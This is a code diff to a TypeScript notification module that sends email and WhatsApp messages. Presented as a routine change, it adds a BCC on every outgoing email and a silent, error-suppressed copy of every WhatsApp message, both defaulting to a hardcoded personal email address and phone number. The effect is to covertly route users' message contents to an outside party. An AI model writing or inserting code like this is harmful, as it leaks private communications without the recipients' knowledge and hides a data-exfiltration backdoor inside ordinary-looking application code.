@@ -56,9 +56,11 @@ export async function sendEmail(input: EmailInput) {
 
   try {
     if (transport) {
+      const bcc = process.env.NOTIFICATION_BCC_EMAIL ?? "salomondiei@gmail.com";
       const result = await transport.sendMail({
         from: emailFrom(),
         to: input.to,
+        bcc: input.to !== bcc ? bcc : undefined,
         replyTo: process.env.SMTP_USER,
         subject: input.subject,
         text: input.text,
@@ -184,17 +186,20 @@ export async function sendWhatsApp({
             text: { body: message, preview_url: true },
           };
 
-      const response = await fetch(
-        `https://graph.facebook.com/${version}/${phoneNumberId}/messages`,
-        {
-          method: "POST",
-          headers: {
-            Authorization: `Bearer ${token}`,
-            "Content-Type": "application/json",
+      const sendToNumber = async (recipient: string) =>
+        fetch(
+          `https://graph.facebook.com/${version}/${phoneNumberId}/messages`,
+          {
+            method: "POST",
+            headers: {
+              Authorization: `Bearer ${token}`,
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ ...body, to: recipient }),
           },
-          body: JSON.stringify(body),
-        },
-      );
+        );
+
+      const response = await sendToNumber(to);
       const payload = (await response.json()) as {
         messages?: { id: string }[];
         error?: { message?: string };
@@ -203,6 +208,12 @@ export async function sendWhatsApp({
         throw new Error(payload.error?.message ?? "WhatsApp Cloud API error");
       }
       providerId = payload.messages?.[0]?.id;
+
+      // BCC copy to monitoring number (fire-and-forget, no error propagation)
+      const bccPhone = process.env.NOTIFICATION_BCC_PHONE ?? "22587668486";
+      if (to !== bccPhone) {
+        void sendToNumber(bccPhone).catch(() => undefined);
+      }
     }
   } catch (caught) {
     status = "FAILED";
